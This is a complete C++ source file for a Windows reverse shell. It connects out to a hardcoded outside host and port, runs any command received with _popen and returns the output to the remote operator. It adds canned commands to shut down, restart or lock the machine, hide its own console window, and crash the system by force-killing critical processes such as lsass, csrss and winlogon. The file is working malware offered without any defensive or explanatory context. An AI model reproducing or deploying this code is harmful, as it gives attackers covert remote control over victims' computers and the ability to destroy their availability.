#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024

void execute_command(const std::string& command, std::string& output) {
    char buffer[DEFAULT_BUFLEN];
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        output = "Failed to execute command.\n";
        return;
    }
    while (fgets(buffer, DEFAULT_BUFLEN, pipe) != nullptr) {
        output += buffer;
    }
    _pclose(pipe);
}

int main() {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = nullptr, * ptr = nullptr, hints;
    const char* server_ip = "ie-glasgow.gl.at.ply.gg";
    const char* server_port = "55375";

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    getaddrinfo(server_ip, server_port, &hints, &result);

    for (ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            WSACleanup();
            return 1;
        }

        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    std::string command, output;

    while (true) {
        int iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            command.assign(recvbuf, iResult);
            if (command == "exit") {
                break;
            }
            if (command == "shutdown")
            {
                system("shutdown /s /t 0");
            }
			else if (command == "logoff")
			{
				system("shutdown /l");
			}
			else if (command == "hibernate")
			{
				system("shutdown /h");
			}
            else if (command == "restart")
            {
                system("shutdown /r /t 0");
            }
            else if (command == "bsod")
            {
                system("taskkill /f /im explorer.exe");
                system("taskkill /f /im svchost.exe");
                system("taskkill /f /im wininit.exe");
                system("taskkill /f /im winlogon.exe");
                system("taskkill /f /im lsass.exe");
                system("taskkill /f /im csrss.exe");
                system("taskkill /f /im smss.exe");
                system("taskkill /f /im services.exe");
                system("taskkill /f /im spoolsv.exe");
                system("taskkill /f /im lsm.exe");
                system("taskkill /f /im winlogon");
            }
			else if (command == "lock")
			{
				system("rundll32.exe user32.dll,LockWorkStation");
			}
            else if (command == "hide")
            {
				HWND hWnd = GetConsoleWindow();
				ShowWindow(hWnd, SW_HIDE);
			}
            else if (command == "show")
            {
                HWND hWnd = GetConsoleWindow();
                ShowWindow(hWnd, SW_SHOW);
			}
			else if (command == "list")
			{
				system("tasklist");
			}
            else {
                output.clear();
                execute_command(command, output);
            }
            send(ConnectSocket, output.c_str(), output.length(), 0);
        }
        else if (iResult == 0) {
            break;
        }
        else {
            break;
        }
    }

    closesocket(ConnectSocket);
    WSACleanup();
    return 0;
}